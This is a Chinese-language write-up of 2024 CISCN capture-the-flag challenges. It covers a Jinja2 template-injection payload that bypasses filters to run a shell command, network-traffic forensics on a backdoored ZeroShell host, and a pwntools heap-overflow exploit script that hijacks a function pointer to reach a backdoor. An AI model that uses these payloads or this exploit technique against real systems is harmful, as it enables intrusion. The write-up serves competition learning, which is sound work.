---
title: 2024CISCN_wp
date: 2024-12-15 12:27:54
updated: 2024-12-15 14:29:56
tags:
  - WriteUp
  - CTF
---
## 3 解题过程

**Safe\_Proxy**

### ·操作内容：

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265676256-3bd9b46b-c212-4c10-904c-9ea13b152a8d.png)

通过&#123;% %&#125;、**'\_'\*2**、引号绕过过滤

**&#123;%set aa='\_'\*2+'globals'+'\_'\*2%&#125;&#123;%set bb='\_'\*2+'builtins'+'\_'\*2%&#125;&#123;%set cc='\_'\*2+'impo''rt'+'\_'\*2%&#125;&#123;%set ddd='so'[::-1]%&#125;&#123;&#123;cycler.next[aa][bb]\[cc\](ddd)\['p''open'\]('nl /flag > app.py').read()&#125;&#125;**

**然后url编码，执行将flag写入app.py**

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265676502-0a3ccd62-ea4b-414c-8e7c-135fb89c5380.png)

**之后再访问主页**

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265676742-8fa75cb0-4371-4a59-8875-fdbf356b241e.png)

### flag值：

flag{e1e294bd-c47b-4fa5-9234-87ba5d0c34e8}

**sc05\_1**

### ·操作内容：

根据题目提示在firewall.xlsx搜索134.6.4.12

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265677000-4eaf3ebd-7aa1-463b-90b3-19b3679b2152.png)

找到对应时间2024/11/09 16:22:42改为2024/11/09\_16:22:42

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265677454-d22b19ce-e151-4a3d-9998-512e9ec63a77.png)

转md5再转大写01DF5BC2388E287D4CC8F11EA4D31929

### flag值：

flag{01DF5BC2388E287D4CC8F11EA4D31929}

  

**zeroshell\_1**

### 操作内容：

1.  用wireshark打开流量文件

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265677620-a75ec3fd-9957-495e-95a7-1f0c7b3abe41.png)

1.  提示执行了命令，搜索常用命令，存在exec记录

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265677997-eabddf7a-c997-43a3-9faf-9d8bec64c433.png)

1.  Referer后为flag，base64解码得到

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265678233-ec1dcb00-b788-463b-9070-e936aac4e943.png)

### flag值：

flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A}

**zeroshell\_2**

### 操作内容

1.  根据第一题筛选出执行命令的语句，复制过来直接利用

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265678379-d335a7d5-0555-49b3-a8ef-735cf685cf0e.png)

执行Find / -name flag，得到路径，进行访问

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265678541-c4f51e21-a217-4c6c-b3a9-40edc9c65109.png)

最后得到flag

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265678846-55248c1c-6fee-4cf8-ba91-fbad64895511.png)

### Flag

Flag{c6045425-6e6e-41d0-be09-95682a4f65c4}

**zeroshell\_3**

### 操作内容

1.  需要查找外联IP，利用前面的命令执行，使用netstat查找

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265679118-28bce986-f578-4f45-a9d6-bf0e5c2e2354.png)

1.  发现202.115.89.103这个外部ip，提交正确

### Flag

Flag{202.115.89.103}

**zeroshell\_4**

### 操作内容

1.  查找本体文件名称，在上一题基础上查看pid

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265679442-c082835d-50ea-4d2b-a7ba-65ff9a85c504.png)

1.  再根据pid查询进程，得到对应文件

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265679798-397f085b-f772-4585-8fbf-17876f7e7d67.png)

### Flag

Flag{.nginx}

**zeroshell\_5**

### 操作内容

1.  读取木马本体文件，先查找文件

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265680074-a64245cb-fcbc-4e9b-b4e0-d6a456a9046e.png)

1.  进行访问

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265680359-2a60b418-7d74-426c-95e3-731128643604.png)

1.  查找之前那个外联ip

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265680760-d4e4947e-3d76-4731-a888-e88b8180524f.png)

尝试提交后面那段字符串为flag

### Flag

Flag{11223344qweasdzxc}

**WinFT\_1**

### 操作内容

1.  打开虚拟机之后，打开文件

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265681267-a90c446b-b5b9-4020-a0ce-e8682df185db.png)

1.  打开exe文件，点击最下面那个文件的属性

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265681787-03fee9d8-2e99-411a-bfcc-49d72d75bf71.png)

1.  拼接flag

flag{miscsecure.com:192.168.116.130:443}

  

**anote**

### 操作内容：

checksec

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265682137-14599f16-0d01-4ba6-9d3c-ac2aced5b884.png)

运行一下，发现打印了一个地址

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265682302-4b32f92a-2917-4966-bb8f-6851e42f4e1c.png)

Gdb调试一下，看看打印地址在哪里

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265682479-70042d66-91b8-455d-aab0-662ca5850db7.png)

发现在堆上，还看到了我们输入的数据

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265682662-70a523e2-8755-4bfa-9704-5a6f3fe68b2b.png)

查看IDA，最大允许输入长度40，构造输入：AAAABBBBCCCCDDDDEEEEFFFFFGGGGHHHHIIIIJJJJ

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265682876-8b86c06e-bff5-461b-9aeb-40c3625b5821.png)

发现一直打印work done,

在IDA中查看地址

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265683032-767e1f88-f4e4-4cf4-93e6-489f7b1e17e9.png)

交叉引用

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265683213-281daf0e-ee2d-416f-86ae-eeee0165741c.png)

发现这个地址就是块最前面的那个地址

块操作结束后，会调用这个位置里面的内容

  

经过反复调试，发现输入为: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHH时，刚好不会报错，长度为32，再多输入一个就会出现错误

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265683358-8fd39ec2-f841-4fe5-8221-d00afc178c1e.png)

32的长度也足够我们溢出修改堆的内容

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1734265683562-7c652f84-7d8c-422c-b9c5-ad26c4e24a17.png)

存在后门

  

攻击思路：

我们可以构造4块

利用第一块得到heap的地址，计算得到第四块写入的地址，再利用第一块溢出到第二块的位置前，并将第二块返回地址改为第四块写入的地址

在第四块写入后门函数的地址

第二块随便输入一个值，启动，实现跳转

  

### 如该题使用自己编写的脚本代码请详细写出，不允许截图

| from pwn import *<br>#context(os = 'linux',arch = 'i386')<br>p = remote('47.94.240.236', 32801)<br>elf = ELF('./note')<br>p.sendlineafter(b'>>', str(1))<br>p.sendlineafter(b'>>', str(1))<br>p.sendlineafter(b'>>', str(1))<br>p.sendlineafter(b'>>', str(1))<br>p.sendlineafter(b'>>', str(2))<br>p.sendlineafter(b': ', str(0))<br>p.recvuntil(b'gift: ')<br>heap_addr = int(p.recv(9),16)<br>chunk = heap_addr + 0x68<br>p.sendlineafter(b'>>', str(3))<br>p.sendlineafter(b': ', str(0))<br>p.sendlineafter(b': ', str(30))<br>p.sendlineafter(b': ', b'a'*0x18 + p32(chunk))<br>p.sendlineafter(b'>>', str(3))<br>p.sendlineafter(b': ', str(3))<br>p.sendlineafter(b': ', str(30))<br>p.sendlineafter(b': ', p32(0x080489CF))<br>p.sendlineafter(b'>>', str(3))<br>p.sendlineafter(b': ', str(1))<br>p.sendlineafter(b': ', str(30))<br>p.sendlineafter(b': ', b'a')<br>p.interactive() |
| --- |

### flag值：

flag{740127c1-4123-47be-b422-3a937549dcc3}
